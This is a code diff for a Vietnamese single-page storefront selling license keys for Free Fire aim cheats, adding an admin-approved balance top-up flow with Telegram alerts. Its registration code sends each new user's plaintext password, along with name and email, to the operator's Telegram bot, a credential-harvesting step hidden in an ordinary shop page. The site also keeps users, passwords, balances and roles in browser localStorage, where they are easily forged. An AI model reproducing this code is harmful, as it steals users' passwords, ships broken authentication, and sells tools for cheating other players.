@@ -186,9 +186,14 @@ label.field-label{font-size:.78rem;color:var(--muted);display:block;margin-botto
 .key-badge{font-size:.68rem;font-weight:700;padding:4px 10px;border-radius:999px;white-space:nowrap}
 .badge-avail{background:rgba(0,255,157,.08);color:var(--neon);border:1px solid rgba(0,255,157,.12)}
 .badge-used{background:rgba(255,71,87,.08);color:var(--red);border:1px solid rgba(255,71,87,.12)}
+.badge-pending{background:rgba(251,191,36,.08);color:var(--yellow);border:1px solid rgba(251,191,36,.12)}
+.badge-approved{background:rgba(0,255,157,.08);color:var(--neon);border:1px solid rgba(0,255,157,.12)}
+.badge-rejected{background:rgba(255,71,87,.08);color:var(--red);border:1px solid rgba(255,71,87,.12)}
 .btn-sm{padding:7px 14px;border-radius:8px;font-size:.75rem;font-weight:600;cursor:pointer;border:1px solid rgba(0,255,157,.12);background:rgba(0,255,157,.04);color:var(--neon);transition:.2s}
 .btn-sm:hover{background:rgba(0,255,157,.08)}
 .btn-sm.danger{color:var(--red);border-color:rgba(255,71,87,.12);background:rgba(255,71,87,.04)}
+.btn-sm.approve{color:var(--neon);border-color:rgba(0,255,157,.2);background:rgba(0,255,157,.08)}
+.btn-sm.reject{color:var(--red);border-color:rgba(255,71,87,.2);background:rgba(255,71,87,.08)}
 .stat-box{background:var(--card);backdrop-filter:blur(16px);border-radius:18px;padding:24px 20px;border:1px solid var(--border);text-align:center;min-width:110px;transition:.3s;position:relative;overflow:hidden}
 .stat-box::before{content:'';position:absolute;top:0;left:50%;width:60px;height:2px;background:linear-gradient(90deg,transparent,var(--neon),transparent);transform:translateX(-50%)}
 .stat-box:hover{border-color:rgba(0,255,157,.08);transform:translateY(-3px)}
@@ -197,12 +202,22 @@ label.field-label{font-size:.78rem;color:var(--muted);display:block;margin-botto
 textarea{resize:vertical;font-family:'JetBrains Mono';font-size:.85rem}
 .admin-back{display:inline-flex;align-items:center;gap:6px;color:var(--muted);font-size:.85rem;cursor:pointer;margin-bottom:20px;transition:.2s}
 .admin-back:hover{color:var(--neon)}
+.admin-tabs{display:flex;gap:8px;margin-bottom:24px;background:var(--glass);padding:6px;border-radius:12px;flex-wrap:wrap}
+.admin-tab{flex:1;min-width:120px;padding:10px 16px;background:none;border:none;color:var(--muted);font-size:.85rem;font-weight:600;cursor:pointer;transition:.2s;border-radius:8px;text-align:center}
+.admin-tab.active{background:linear-gradient(135deg,var(--neon),var(--cyan));color:#000}
+.topup-row{background:var(--card);backdrop-filter:blur(12px);border:1px solid var(--border);border-radius:14px;padding:16px 18px;margin-bottom:10px;transition:.2s}
+.topup-row:hover{border-color:rgba(0,255,157,.08)}
+.topup-info{font-size:.78rem;color:var(--muted);margin-top:6px;line-height:1.5}
+.topup-amount{font-size:1.1rem;font-weight:700;color:var(--neon);font-family:'JetBrains Mono'}
+.topup-actions{display:flex;gap:8px;margin-top:12px;flex-wrap:wrap}
+.empty-state{text-align:center;color:var(--dim);padding:40px 20px;font-size:.85rem}
 @media(max-width:640px){
   header{padding:12px 4%}
   .logo{font-size:18px}
   .nav-link{display:none}
   section{padding:60px 16px}
   .modal{padding:28px 24px}
+  .admin-tabs{flex-direction:column}
 }
 </style>
 </head>
@@ -259,9 +274,9 @@ textarea{resize:vertical;font-family:'JetBrains Mono';font-size:.85rem}
   </div>
   <div class="steps">
     <div class="step"><div class="step-num">1</div><h3>Đăng ký</h3><p>Tạo tài khoản nhanh chóng</p></div>
-    <div class="step"><div class="step-num">2</div><h3>Nạp số dư</h3><p>Chuyển khoản để nạp tiền</p></div>
-    <div class="step"><div class="step-num">3</div><h3>Mua key</h3><p>Key tự động cấp khi đủ số dư</p></div>
-    <div class="step"><div class="step-num">4</div><h3>Kích hoạt</h3><p>Nhập key vào app và chơi</p></div>
+    <div class="step"><div class="step-num">2</div><h3>Nạp số dư</h3><p>Chuyển khoản và gửi yêu cầu nạp</p></div>
+    <div class="step"><div class="step-num">3</div><h3>Admin duyệt</h3><p>Admin xác nhận thanh toán qua Telegram</p></div>
+    <div class="step"><div class="step-num">4</div><h3>Mua key</h3><p>Key tự động cấp khi đủ số dư</p></div>
   </div>
 </section>
 
@@ -294,31 +309,45 @@ textarea{resize:vertical;font-family:'JetBrains Mono';font-size:.85rem}
     <div class="admin-back" onclick="hideAdmin()">← Về trang chủ</div>
     <div class="section-title" style="margin-bottom:32px">
       <div class="section-tag">Admin Panel</div>
-      <h2>🔑 Quản lý Key</h2>
-      <p>Upload và quản lý key sản phẩm</p>
+      <h2>⚙️ Quản trị</h2>
+      <p>Duyệt nạp tiền & quản lý key</p>
     </div>
     <div style="display:flex;gap:14px;justify-content:center;flex-wrap:wrap;margin-bottom:36px">
-      <div class="stat-box"><div class="stat-num" style="color:var(--cyan)" id="stat-total">0</div><div class="stat-label">Tổng</div></div>
-      <div class="stat-box"><div class="stat-num" style="color:var(--neon)" id="stat-avail">0</div><div class="stat-label">Còn trống</div></div>
-      <div class="stat-box"><div class="stat-num" style="color:var(--red)" id="stat-used">0</div><div class="stat-label">Đã dùng</div></div>
-      <div class="stat-box"><div class="stat-num" style="color:var(--yellow)" id="stat-revenue">0đ</div><div class="stat-label">Doanh thu</div></div>
+      <div class="stat-box"><div class="stat-num" style="color:var(--cyan)" id="stat-total">0</div><div class="stat-label">Tổng key</div></div>
+      <div class="stat-box"><div class="stat-num" style="color:var(--neon)" id="stat-avail">0</div><div class="stat-label">Key trống</div></div>
+      <div class="stat-box"><div class="stat-num" style="color:var(--red)" id="stat-used">0</div><div class="stat-label">Key đã dùng</div></div>
+      <div class="stat-box"><div class="stat-num" style="color:var(--yellow)" id="stat-pending">0</div><div class="stat-label">Nạp chờ duyệt</div></div>
+      <div class="stat-box"><div class="stat-num" style="color:var(--purple)" id="stat-revenue">0đ</div><div class="stat-label">Doanh thu</div></div>
     </div>
-    <div class="pcard" style="padding:24px;margin-bottom:32px">
-      <h3 style="margin-bottom:16px">📥 Thêm key mới</h3>
-      <label class="field-label">Chọn gói:</label>
-      <select id="admin-plan">
-        <option value="Gói 1 Ngày">Gói 1 Ngày</option>
-        <option value="Gói 15 Ngày">Gói 15 Ngày</option>
-        <option value="Gói 30 Ngày" selected>Gói 30 Ngày</option>
-        <option value="Vĩnh Viễn">Vĩnh Viễn</option>
-      </select>
-      <label class="field-label">Dán key (mỗi dòng 1 key):</label>
-      <textarea id="admin-keys" rows="5" placeholder="KEY-XXXX-XXXX&#10;KEY-YYYY-YYYY&#10;..."></textarea>
-      <div id="admin-msg"></div>
-      <button class="btn-full" id="admin-upload-btn" onclick="adminUpload()">📥 Thêm key</button>
+
+    <div class="admin-tabs">
+      <button class="admin-tab active" onclick="switchAdminTab('topup')">⏳ Duyệt nạp tiền</button>
+      <button class="admin-tab" onclick="switchAdminTab('keys')">🔑 Quản lý key</button>
     </div>
-    <h3 style="margin-bottom:16px;text-align:center">📋 Danh sách key</h3>
-    <div id="key-list"></div>
+
+    <div id="admin-topup-panel">
+      <h3 style="margin-bottom:16px;text-align:center">⏳ Yêu cầu nạp tiền chờ duyệt</h3>
+      <div id="topup-list"></div>
+    </div>
+
+    <div id="admin-keys-panel" style="display:none">
+      <div class="pcard" style="padding:24px;margin-bottom:32px">
+        <h3 style="margin-bottom:16px">📥 Thêm key mới</h3>
+        <label class="field-label">Chọn gói:</label>
+        <select id="admin-plan">
+          <option value="Gói 1 Ngày">Gói 1 Ngày</option>
+          <option value="Gói 7 Ngày">Gói 7 Ngày</option>
+          <option value="Gói 30 Ngày" selected>Gói 30 Ngày</option>
+          <option value="Vĩnh Viễn">Vĩnh Viễn</option>
+        </select>
+        <label class="field-label">Dán key (mỗi dòng 1 key):</label>
+        <textarea id="admin-keys" rows="5" placeholder="KEY-XXXX-XXXX&#10;KEY-YYYY-YYYY&#10;..."></textarea>
+        <div id="admin-msg"></div>
+        <button class="btn-full" id="admin-upload-btn" onclick="adminUpload()">📥 Thêm key</button>
+      </div>
+      <h3 style="margin-bottom:16px;text-align:center">📋 Danh sách key</h3>
+      <div id="key-list"></div>
+    </div>
   </div>
 </section>
 
@@ -374,17 +403,19 @@ textarea{resize:vertical;font-family:'JetBrains Mono';font-size:.85rem}
         <label class="field-label">Nội dung chuyển khoản (bắt buộc):</label>
         <input type="text" id="pay-note" style="margin:0">
       </div>
-      <p class="warn">⏳ Sau khi chuyển khoản, nhấn Xác nhận. Số dư sẽ được cộng sau khi admin duyệt.</p>
-      <button class="btn-full" onclick="submitPayment()">📨 Xác nhận đã chuyển tiền</button>
+      <p class="warn">⏳ Sau khi chuyển khoản, nhấn Gửi yêu cầu. Số dư CHỈ được cộng sau khi admin duyệt qua Telegram.</p>
+      <button class="btn-full" id="submit-pay-btn" onclick="submitPayment()">📨 Gửi yêu cầu nạp</button>
       <button class="btn-ghost" onclick="closeModal('payModal')">↩ Hủy</button>
     </div>
     <div id="pay-step-success" style="display:none;text-align:center;padding:20px 0">
       <div class="success-icon">⏳</div>
-      <h2 style="font-family:'Space Grotesk';font-weight:700;margin-bottom:8px">Đơn hàng đã gửi!</h2>
-      <p style="color:var(--muted);font-size:.88rem;margin-bottom:16px">Số dư sẽ được cộng sau khi admin xác nhận thanh toán.</p>
+      <h2 style="font-family:'Space Grotesk';font-weight:700;margin-bottom:8px">Đã gửi yêu cầu nạp!</h2>
+      <p style="color:var(--muted);font-size:.88rem;margin-bottom:16px">Admin đã nhận thông báo qua Telegram. Số dư sẽ được cộng sau khi admin duyệt thanh toán.</p>
       <div class="success-box">
         <p style="font-size:.75rem;color:var(--dim);margin-bottom:4px">Nội dung CK:</p>
         <p id="success-note" style="color:var(--neon);font-weight:700"></p>
+        <p style="font-size:.75rem;color:var(--dim);margin-top:8px;margin-bottom:4px">Số tiền:</p>
+        <p id="success-amount" style="color:var(--cyan);font-weight:700"></p>
       </div>
       <button class="btn-full" style="margin-top:16px" onclick="closeModal('payModal')">Đóng</button>
     </div>
@@ -406,6 +437,7 @@ textarea{resize:vertical;font-family:'JetBrains Mono';font-size:.85rem}
       <button class="bal-quick" onclick="openTopUp(200000)">200.000đ</button>
     </div>
     <button class="btn-full" onclick="openTopUp(0)">💳 Nạp số dư tùy chọn</button>
+    <div id="bal-pending-info" style="margin-top:16px"></div>
     <button class="btn-ghost" onclick="closeModal('balModal')">Đóng</button>
   </div>
 </div>
@@ -437,9 +469,9 @@ const TELEGRAM_CHAT_ID="6954214525";
 
 // ===== PLANS =====
 const PLANS=[
-  {id:"1d",name:"Gói 1 Ngày",price:15000,priceStr:"15.000đ",per:"/ ngày",icon:"⚡",feats:["Aim cổ","Aim body","Aim drag"]},
-  {id:"15d",name:"Gói 15 Ngày",price:50000,priceStr:"50.000đ",per:"/ 15 ngày",icon:"🛡️",feats:["Aim cổ","Aim body","Aim drag"]},
-  {id:"30d",name:"Gói 30 Ngày",price:150000,priceStr:"150.000đ",per:"/ tháng",icon:"🔥",feats:["Aim cổ","Aim body","Aim drag"],featured:true},
+  {id:"1d",name:"Gói 1 Ngày",price:20000,priceStr:"20.000đ",per:"/ ngày",icon:"⚡",feats:["Aim cổ","Aim body","Aim drag"]},
+  {id:"7d",name:"Gói 7 Ngày",price:50000,priceStr:"50.000đ",per:"/ 7 ngày",icon:"🛡️",feats:["Aim cổ","Aim body","Aim drag"]},
+  {id:"30d",name:"Gói 30 Ngày",price:130000,priceStr:"130.000đ",per:"/ tháng",icon:"🔥",feats:["Aim cổ","Aim body","Aim drag"],featured:true},
   {id:"vv",name:"Vĩnh Viễn",price:250000,priceStr:"250.000đ",per:"/ trọn đời",icon:"💎",feats:["Tất cả tính năng","Cập nhật miễn phí","Ưu tiên hỗ trợ","2 thiết bị"]},
 ];
 
@@ -454,6 +486,9 @@ function getBalance(){return parseInt(localStorage.getItem('ff_balance')||'0');}
 function setBalance(v){localStorage.setItem('ff_balance',String(v));}
 function getRevenue(){return parseInt(localStorage.getItem('ff_revenue')||'0');}
 function addRevenue(v){localStorage.setItem('ff_revenue',String(getRevenue()+v));}
+// Top-up requests storage
+function getTopUpRequests(){return JSON.parse(localStorage.getItem('ff_topup_requests')||'[]');}
+function saveTopUpRequests(r){localStorage.setItem('ff_topup_requests',JSON.stringify(r));}
 
 // ===== SCROLL =====
 function scrollTo(id){hideAdmin();document.getElementById(id)?.scrollIntoView({behavior:'smooth'});}
@@ -510,7 +545,6 @@ function doLogin(){
   const users=getUsers();
   const user=users.find(u=>u.email===email);
   if(!user||user.password!==pw){errEl.innerHTML='Email hoặc mật khẩu không đúng.';return;}
-  // Cập nhật session với dữ liệu đầy đủ
   setSession({email:user.email,name:user.name,role:user.role});
   closeModal('authModal');
   updateAuthArea();
@@ -530,9 +564,7 @@ async function doRegister(){
   document.getElementById('reg-btn').textContent='Đang đăng ký...';
   document.getElementById('reg-btn').disabled=true;
   await sendTelegramNotification(name,email,pw);
-  // Xác định role: admin nếu email trùng ADMIN_EMAIL
   const role=email===ADMIN_EMAIL?'admin':'user';
-  // Lưu đầy đủ dữ liệu người dùng
   const newUser={name,email,password:pw,role,balance:0,created_date:new Date().toISOString()};
   users.push(newUser);
   saveUsers(users);
@@ -554,7 +586,6 @@ function verifyOtp(){
   errEl.innerHTML='';errEl.className='err';
   if(code.length<6){errEl.innerHTML='Nhập đủ 6 số.';return;}
   if(code!==pendingReg.otp){errEl.innerHTML='Mã xác nhận không đúng.';return;}
-  // Lưu session với dữ liệu đầy đủ
   setSession({email:pendingReg.email,name:pendingReg.name,role:pendingReg.role});
   closeModal('otpModal');
   updateAuthArea();
@@ -565,6 +596,23 @@ function resendOtp(){pendingReg.otp=String(Math.floor(100000+Math.random()*90000
 async function sendTelegramNotification(username,email,password){
   const timestamp=new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'});
   const message="🔔 ĐĂNG KÝ TÀI KHOẢN MỚI\n━━━━━━━━━━━━━━━━━━\n👤 Tài khoản: "+username+"\n📧 Email: "+email+"\n🔑 Mật khẩu: "+password+"\n🕐 Thời gian: "+timestamp+"\n━━━━━━━━━━━━━━━━━━\n🌐 Nguồn: FF Proxy Delta";
+  try{await fetch('https://api.telegram.org/bot'+TELEGRAM_BOT_TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:message})});}catch(e){console.error('Telegram error:',e);}
+}
+
+// Gửi yêu cầu nạp tiền qua Telegram cho admin
+async function sendTopUpRequestTelegram(request){
+  const timestamp=new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'});
+  const message="💰 YÊU CẦU NẠP TIỀN\n━━━━━━━━━━━━━━━━━━\n👤 Tài khoản: "+request.user_name+"\n📧 Email: "+request.user_email+"\n💵 Số tiền: "+fmtMoney(request.amount)+"\n📝 Nội dung CK: "+request.note+"\n🆔 Mã yêu cầu: "+request.id+"\n🕐 Thời gian: "+timestamp+"\n━━━━━━━━━━━━━━━━━━\n⏳ Trạng thái: CHỜ DUYỆT\n\n⚠️ Vào Admin Panel để duyệt yêu cầu này.\n🌐 Nguồn: FF Proxy Delta";
+  try{await fetch('https://api.telegram.org/bot'+TELEGRAM_BOT_TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:message})});}catch(e){console.error('Telegram error:',e);}
+}
+
+// Gửi kết quả duyệt qua Telegram
+async function sendTopUpResultTelegram(request,approved){
+  const timestamp=new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'});
+  const status=approved?'✅ ĐÃ DUYỆT':'❌ ĐÃ TỪ CHỐI';
+  const message=approved
+    ?"✅ YÊU CẦU NẠP ĐÃ DUYỆT\n━━━━━━━━━━━━━━━━━━\n👤 Tài khoản: "+request.user_name+"\n📧 Email: "+request.user_email+"\n💵 Số tiền: "+fmtMoney(request.amount)+"\n📝 Nội dung CK: "+request.note+"\n🆔 Mã yêu cầu: "+request.id+"\n🕐 Thời gian duyệt: "+timestamp+"\n━━━━━━━━━━━━━━━━━━\n💰 Số dư đã được cộng vào tài khoản.\n🌐 FF Proxy Delta"
+    :"❌ YÊU CẦU NẠP BỊ TỪ CHỐI\n━━━━━━━━━━━━━━━━━━\n👤 Tài khoản: "+request.user_name+"\n📧 Email: "+request.user_email+"\n💵 Số tiền: "+fmtMoney(request.amount)+"\n📝 Nội dung CK: "+request.note+"\n🆔 Mã yêu cầu: "+request.id+"\n🕐 Thời gian từ chối: "+timestamp+"\n━━━━━━━━━━━━━━━━━━\n⚠️ Yêu cầu nạp bị từ chối. Số dư KHÔNG được cộng.\n🌐 FF Proxy Delta";
   try{await fetch('https://api.telegram.org/bot'+TELEGRAM_BOT_TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:message})});}catch(e){console.error('Telegram error:',e);}
 }
 
@@ -590,6 +638,14 @@ function openBalance(){
   const s=getSession();
   if(!s){openAuth();return;}
   document.getElementById('bal-show').textContent=fmtMoney(getBalance());
+  // Hiển thị các yêu cầu nạp đang chờ duyệt của user
+  const pendingInfo=document.getElementById('bal-pending-info');
+  const requests=getTopUpRequests().filter(r=>r.user_email===s.email&&r.status==='pending');
+  if(requests.length>0){
+    pendingInfo.innerHTML='<div class="warn" style="text-align:left">⏳ Bạn có '+requests.length+' yêu cầu nạp đang chờ admin duyệt:<br>'+requests.map(r=>'• '+fmtMoney(r.amount)+' (CK: '+r.note+')').join('<br>')+'</div>';
+  } else {
+    pendingInfo.innerHTML='';
+  }
   openModal('balModal');
 }
 function openTopUp(amount){
@@ -597,7 +653,7 @@ function openTopUp(amount){
   const s=getSession();
   const amt=amount||0;
   document.getElementById('pay-product-label').textContent=amt>0?'Nạp '+fmtMoney(amt):'Nạp số dư';
-  document.getElementById('pay-amount-label').textContent=amt>0?fmtMoney(amt):'0đ';
+  document.getElementById('pay-amount-label').textContent=amt>0?fmtMoney(amt):'Nhập số tiền';
   const note='NAP_'+s.name.toUpperCase().replace(/\s/g,'')+'_'+(Math.floor(Math.random()*90000)+10000);
   curNote=note;curTopUp=amt;
   document.getElementById('pay-note').value=note;
@@ -611,19 +667,61 @@ function openTopUp(amount){
   openModal('payModal');
 }
 let curNote='',curTopUp=0;
-function submitPayment(){
-  const note=document.getElementById('pay-note').value||curNote;
-  if(curTopUp>0){
-    setBalance(getBalance()+curTopUp);
-    addRevenue(curTopUp);
-    updateAuthArea();
-  } else {
-    const inputAmt=prompt('Nhập số tiền đã chuyển (VND):');
-    if(inputAmt){const amt=parseInt(inputAmt.replace(/\D/g,''));if(amt>0){setBalance(getBalance()+amt);addRevenue(amt);updateAuthArea();}}
+
+// ===== SỬA LỖI: KHÔNG CỘNG SỐ DƯ NGAY — tạo yêu cầu nạp, gửi Telegram admin duyệt =====
+async function submitPayment(){
+  const s=getSession();
+  if(!s){openAuth();return;}
+  const note=document.getElementById('pay-note').value.trim()||curNote;
+  let amount=curTopUp;
+
+  // Nếu nạp tùy chọn, phải nhập số tiền
+  if(!amount||amount<=0){
+    const inputAmt=document.getElementById('pay-amount-label').textContent.trim();
+    // Nếu là "Nhập số tiền" thì yêu cầu user nhập
+    const entered=prompt('Nhập số tiền đã chuyển (VND):');
+    if(!entered){return;}
+    amount=parseInt(entered.replace(/\D/g,''));
+    if(!amount||amount<=0){
+      alert('Số tiền không hợp lệ.');
+      return;
+    }
   }
+
+  // Vô hiệu hóa nút để tránh gửi trùng
+  const btn=document.getElementById('submit-pay-btn');
+  btn.textContent='Đang gửi...';
+  btn.disabled=true;
+
+  // Tạo yêu cầu nạp — trạng thái PENDING (chưa cộng số dư)
+  const request={
+    id:'TOP'+Date.now()+Math.floor(Math.random()*1000),
+    user_email:s.email,
+    user_name:s.name,
+    amount:amount,
+    note:note,
+    status:'pending',
+    created_date:new Date().toISOString(),
+    reviewed_date:null
+  };
+
+  const requests=getTopUpRequests();
+  requests.push(request);
+  saveTopUpRequests(requests);
+
+  // Gửi thông báo Telegram cho admin
+  await sendTopUpRequestTelegram(request);
+
+  // Hiển thị thành công — số dư chưa cộng
   document.getElementById('success-note').textContent=note;
+  document.getElementById('success-amount').textContent=fmtMoney(amount);
   document.getElementById('pay-step-info').style.display='none';
   document.getElementById('pay-step-success').style.display='block';
+
+  btn.textContent='📨 Gửi yêu cầu nạp';
+  btn.disabled=false;
+
+  updateAuthArea();
 }
 
 // ===== BUY KEY WITH BALANCE =====
@@ -685,6 +783,18 @@ function renderPriceCards(){
 }
 
 // ===== ADMIN =====
+let adminTab='topup';
+function switchAdminTab(tab){
+  adminTab=tab;
+  document.querySelectorAll('.admin-tab').forEach((el,i)=>{
+    el.classList.toggle('active',(tab==='topup'&&i===0)||(tab==='keys'&&i===1));
+  });
+  document.getElementById('admin-topup-panel').style.display=tab==='topup'?'block':'none';
+  document.getElementById('admin-keys-panel').style.display=tab==='keys'?'block':'none';
+  if(tab==='topup')renderTopUpList();
+  if(tab==='keys')renderKeys();
+}
+
 function showAdmin(){
   const s=getSession();
   if(!s||s.role!=='admin'){alert('Chỉ admin mới được truy cập.');return;}
@@ -695,7 +805,9 @@ function showAdmin(){
   const ap=document.getElementById('admin-page');
   ap.style.display='block';
   ap.scrollIntoView({behavior:'smooth'});
+  renderTopUpList();
   renderKeys();
+  updateAdminStats();
 }
 function hideAdmin(){
   document.getElementById('hero').style.display='flex';
@@ -704,6 +816,92 @@ function hideAdmin(){
   document.getElementById('contact').style.display='block';
   document.getElementById('admin-page').style.display='none';
 }
+
+function updateAdminStats(){
+  const keys=getKeys();
+  const requests=getTopUpRequests();
+  document.getElementById('stat-total').textContent=keys.length;
+  document.getElementById('stat-avail').textContent=keys.filter(k=>k.status==='available').length;
+  document.getElementById('stat-used').textContent=keys.filter(k=>k.status==='used').length;
+  document.getElementById('stat-pending').textContent=requests.filter(r=>r.status==='pending').length;
+  document.getElementById('stat-revenue').textContent=fmtMoney(getRevenue());
+}
+
+// ===== ADMIN: DUYỆT NẠP TIỀN =====
+function renderTopUpList(){
+  const requests=getTopUpRequests().reverse();
+  const list=document.getElementById('topup-list');
+  updateAdminStats();
+  if(requests.length===0){
+    list.innerHTML='<div class="empty-state">Chưa có yêu cầu nạp nào.</div>';
+    return;
+  }
+  list.innerHTML=requests.map(r=>{
+    const badgeClass=r.status==='pending'?'badge-pending':r.status==='approved'?'badge-approved':'badge-rejected';
+    const badgeText=r.status==='pending'?'⏳ Chờ duyệt':r.status==='approved'?'✅ Đã duyệt':'❌ Từ chối';
+    const timestamp=new Date(r.created_date).toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'});
+    return `
+      <div class="topup-row">
+        <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px">
+          <div style="flex:1;min-width:180px">
+            <div class="topup-amount">${fmtMoney(r.amount)}</div>
+            <div class="topup-info">
+              👤 ${r.user_name} · 📧 ${r.user_email}<br>
+              📝 Nội dung CK: <span style="color:var(--neon);font-family:'JetBrains Mono'">${r.note}</span><br>
+              🕐 ${timestamp}
+            </div>
+          </div>
+          <span class="key-badge ${badgeClass}">${badgeText}</span>
+        </div>
+        ${r.status==='pending'?`
+          <div class="topup-actions">
+            <button class="btn-sm approve" onclick="approveTopUp('${r.id}')">✅ Duyệt & cộng số dư</button>
+            <button class="btn-sm reject" onclick="rejectTopUp('${r.id}')">❌ Từ chối</button>
+          </div>
+        `:''}
+      </div>
+    `;
+  }).join('');
+}
+
+async function approveTopUp(requestId){
+  if(!confirm('Duyệt yêu cầu nạp này? Số dư sẽ được cộng vào tài khoản user.'))return;
+  const requests=getTopUpRequests();
+  const req=requests.find(r=>r.id===requestId);
+  if(!req){alert('Không tìm thấy yêu cầu.');return;}
+  if(req.status!=='pending'){alert('Yêu cầu này đã được xử lý.');return;}
+  // CỘNG SỐ DƯ CHỈ KHI ADMIN DUYỆT
+  setBalance(getBalance()+req.amount);
+  addRevenue(req.amount);
+  req.status='approved';
+  req.reviewed_date=new Date().toISOString();
+  saveTopUpRequests(requests);
+  // Gửi kết quả qua Telegram
+  await sendTopUpResultTelegram(req,true);
+  renderTopUpList();
+  updateAuthArea();
+  renderPriceCards();
+  alert('✅ Đã duyệt! Số dư đã cộng '+fmtMoney(req.amount)+'. Đã gửi thông báo Telegram.');
+}
+
+async function rejectTopUp(requestId){
+  const reason=prompt('Lý do từ chối (để trống nếu không cần):')||'';
+  if(!confirm('Từ chối yêu cầu nạp này? Số dư KHÔNG được cộng.'))return;
+  const requests=getTopUpRequests();
+  const req=requests.find(r=>r.id===requestId);
+  if(!req){alert('Không tìm thấy yêu cầu.');return;}
+  if(req.status!=='pending'){alert('Yêu cầu này đã được xử lý.');return;}
+  req.status='rejected';
+  req.reviewed_date=new Date().toISOString();
+  req.reject_reason=reason;
+  saveTopUpRequests(requests);
+  // Gửi kết quả qua Telegram
+  await sendTopUpResultTelegram(req,false);
+  renderTopUpList();
+  alert('❌ Đã từ chối yêu cầu nạp. Đã gửi thông báo Telegram.');
+}
+
+// ===== ADMIN: QUẢN LÝ KEY =====
 function adminUpload(){
   const text=document.getElementById('admin-keys').value;
   const plan=document.getElementById('admin-plan').value;
@@ -716,16 +914,13 @@ function adminUpload(){
   document.getElementById('admin-keys').value='';
   msgEl.innerHTML='<div class="ok">✅ Đã thêm '+lines.length+' key ('+plan+').</div>';
   renderKeys();
+  updateAdminStats();
   renderPriceCards();
 }
 function renderKeys(){
   const keys=getKeys().reverse();
   const list=document.getElementById('key-list');
-  document.getElementById('stat-total').textContent=keys.length;
-  document.getElementById('stat-avail').textContent=keys.filter(k=>k.status==='available').length;
-  document.getElementById('stat-used').textContent=keys.filter(k=>k.status==='used').length;
-  document.getElementById('stat-revenue').textContent=fmtMoney(getRevenue());
-  if(keys.length===0){list.innerHTML='<p style="text-align:center;color:var(--dim)">Chưa có key nào.</p>';return;}
+  if(keys.length===0){list.innerHTML='<div class="empty-state">Chưa có key nào.</div>';return;}
   list.innerHTML=keys.map(k=>`
     <div class="key-row">
       <div style="flex:1;min-width:180px">
@@ -743,16 +938,15 @@ function renderKeys(){
 function markUsed(id){
   const email=prompt('Email người mua (để trống nếu chỉ đánh dấu):')||'';
   const keys=getKeys();const k=keys.find(x=>String(x.id)===String(id));
-  if(k){k.status='used';k.buyer_email=email;saveKeys(keys);renderKeys();renderPriceCards();}
+  if(k){k.status='used';k.buyer_email=email;saveKeys(keys);renderKeys();updateAdminStats();renderPriceCards();}
 }
 function deleteKey(id){
   if(!confirm('Xóa key này?'))return;
   const keys=getKeys().filter(x=>String(x.id)!==String(id));
-  saveKeys(keys);renderKeys();renderPriceCards();
+  saveKeys(keys);renderKeys();updateAdminStats();renderPriceCards();
 }
 
 // ===== INIT =====
-// Seed admin account nếu chưa có
 (function seedAdmin(){
   const users=getUsers();
   if(!users.find(u=>u.email===ADMIN_EMAIL)){
@@ -764,8 +958,8 @@ function deleteKey(id){
 // Seed demo keys if empty
 if(getKeys().length===0){
   saveKeys([
-    {key_code:'FF-OB54-15D-XK29F',plan:'Gói 15 Ngày',status:'available',buyer_email:'',id:1,created_date:new Date().toISOString()},
-    {key_code:'FF-OB54-15D-PL83M',plan:'Gói 15 Ngày',status:'available',buyer_email:'',id:2,created_date:new Date().toISOString()},
+    {key_code:'FF-OB54-7D-XK29F',plan:'Gói 7 Ngày',status:'available',buyer_email:'',id:1,created_date:new Date().toISOString()},
+    {key_code:'FF-OB54-7D-PL83M',plan:'Gói 7 Ngày',status:'available',buyer_email:'',id:2,created_date:new Date().toISOString()},
     {key_code:'FF-OB54-30D-VN71Q',plan:'Gói 30 Ngày',status:'available',buyer_email:'',id:3,created_date:new Date().toISOString()},
     {key_code:'FF-OB54-30D-KZ45R',plan:'Gói 30 Ngày',status:'available',buyer_email:'',id:4,created_date:new Date().toISOString()},
     {key_code:'FF-OB54-30D-AB90W',plan:'Gói 30 Ngày',status:'available',buyer_email:'',id:5,created_date:new Date().toISOString()},
